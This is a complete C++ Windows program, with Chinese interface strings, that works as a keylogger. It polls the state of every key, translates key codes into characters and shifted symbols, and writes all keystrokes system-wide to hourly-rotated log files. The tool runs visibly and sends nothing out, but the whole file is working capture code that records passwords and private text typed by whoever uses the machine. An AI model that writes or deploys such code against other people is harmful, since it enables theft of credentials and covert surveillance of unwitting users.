#include<bits/stdc++.h>
#include<windows.h>
#include<fstream>
#include<ctime>
#include<clocale>
using namespace std;
#define KD(v) ((GetAsyncKeyState(v)&0x8000)?1:0)

bool lst[256];
ofstream fout;
string curFile;
time_t lastTime;
string mp[256];
string lastType="";

string now(){
	time_t t=time(0);
	tm* lt=localtime(&t);
	char buf[80];
	strftime(buf,80,"%Y%m%d_%H%M%S",lt);
	return string(buf);
}
void newFile(){
	if(fout.is_open()) fout.close();
	curFile="keylog_"+now()+".txt";
	fout.open(curFile,ios::app);
	if(!fout.is_open()){MessageBox(NULL,"无法创建日志文件！","错误",MB_ICONERROR); exit(1);}
	lastTime=time(0);
	fout<<"=== 键盘记录开始 "<<__DATE__<<" "<<__TIME__<<" ==="<<endl;
}
void check(){
	time_t cur=time(0);
	if(difftime(cur,lastTime)>=3600) newFile();
}
string type(int c){
	if(65<=c&&c<=90) return "LETTER";
	if(48<=c&&c<=57) return "DIGIT";
	if(186<=c&&c<=192||219<=c&&c<=222) return "SYMBOL";
	if(112<=c&&c<=123) return "FUNCTION";
	if(96<=c&&c<=111) return "NUMPAD";
	if(c==32) return "SPACE";
	if(c==13||c==9||c==8) return "CONTROL";
	if(37<=c&&c<=40) return "ARROW";
	if(c==16||c==17||c==18||c==20) return "MODIFIER";
	if(c==91||c==92) return "WINDOWS";
	return "OTHER";
}
void init(){
	for(int i=8;i<=255;i++) mp[i]="";
	for(int i=48;i<=57;i++) mp[i]=string(1,(char)i);
	for(int i=65;i<=90;i++) mp[i]=string(1,(char)i);
	for(int i=96;i<=105;i++) mp[i]="N"+string(1,(char)(i-96+'0'));
	for(int i=112;i<=120;i++) mp[i]="F"+string(1,(char)(i-111+'0'));
	mp[8]="[Backspace]"; mp[9]="[Tab]"; mp[13]="[Enter]\n";
	mp[16]="[Shift]"; mp[17]="[Ctrl]"; mp[18]="[Alt]"; mp[20]="[Caps Lock]";
	mp[27]="[Esc]"; mp[32]=" "; mp[33]="[Page Up]"; mp[34]="[Page Down]";
	mp[35]="[End]"; mp[36]="[Home]"; mp[37]="[Left]"; mp[38]="[Up]";
	mp[39]="[Right]"; mp[40]="[Down]"; mp[45]="[Ins]"; mp[46]="[Del]";
	mp[91]="[Win]"; mp[92]="[Win]"; mp[93]="[RightK]";
	mp[106]="[N*]"; mp[107]="[N+]"; mp[109]="[N-]"; mp[110]="[N.]"; mp[111]="[N/]";
	mp[121]="[F10]"; mp[122]="[F11]"; mp[123]="[F12]"; mp[144]="[Num Lock]";
	mp[186]=";"; mp[187]="="; mp[188]=","; mp[189]="-"; mp[190]="."; mp[191]="/";
	mp[192]="`"; mp[219]="["; mp[220]="\\"; mp[221]="]"; mp[222]="'";
}
string shiftKey(int c,bool sh){
	if(!sh) return mp[c];
	if(48<=c&&c<=57){
		switch(c){
			case 48: return ")"; case 49: return "!"; case 50: return "@";
			case 51: return "#"; case 52: return "$"; case 53: return "%";
			case 54: return "^"; case 55: return "&"; case 56: return "*";
			case 57: return "(";
		}
	}
	switch(c){
		case 186: return ":"; case 187: return "+"; case 188: return "<";
		case 189: return "_"; case 190: return ">"; case 191: return "?";
		case 192: return "~"; case 219: return "{"; case 220: return "|";
		case 221: return "}"; case 222: return "\"";
	}
	return mp[c];
}
void add(string key,string t){
	if(t!=lastType&&lastType!="") fout<<"\n";
	fout<<key; fout.flush();
	lastType=t;
}
int main(){
	setlocale(LC_ALL, "zh_CN.UTF-8");
	system("chcp 65001");
	newFile(); init();
	cout<<"键盘记录已开始，数据将保存到 "<<curFile<<"\n每小时将自动创建新文件\n按 Ctrl+C 退出程序\n";
	for(int i=0;i<256;i++) lst[i]=KD(i);
	while(1){
		check();
		bool sh=GetAsyncKeyState(VK_SHIFT)&0x8000;
		for(int i=8;i<=255;i++){
			if(160<=i&&i<=163) continue;
			bool cur=KD(i);
			if(cur!=lst[i]){
				lst[i]=cur;
				if(cur){
					if(mp[i]!=""){
						string t=type(i),out=mp[i];
						if((48<=i&&i<=57)||(186<=i&&i<=192)||(219<=i&&i<=222)) out=shiftKey(i,sh);
						if(65<=i&&i<=90&&!sh) out=string(1,(char)(i+32));
						add(out,t);
					}
				}else{
					string r="";
					if(i==16) r=" [Shift UP] ";
					else if(i==17) r=" [Ctrl UP] ";
					else if(i==18) r=" [Alt UP] ";
					else if(i==91||i==92) r=" [Win UP] ";
					if(r!="") add(r,"MODIFIER_RELEASE");
				}
			}
		}
		Sleep(3);
		if(GetAsyncKeyState(VK_CONTROL)&0x8000 && GetAsyncKeyState('C')&0x8000) break;
	}
	fout<<"\n=== 键盘记录结束 ==="<<endl;
	fout.close();
	cout<<"\n程序已退出，记录保存在 "<<curFile<<endl;
	return 0;
}
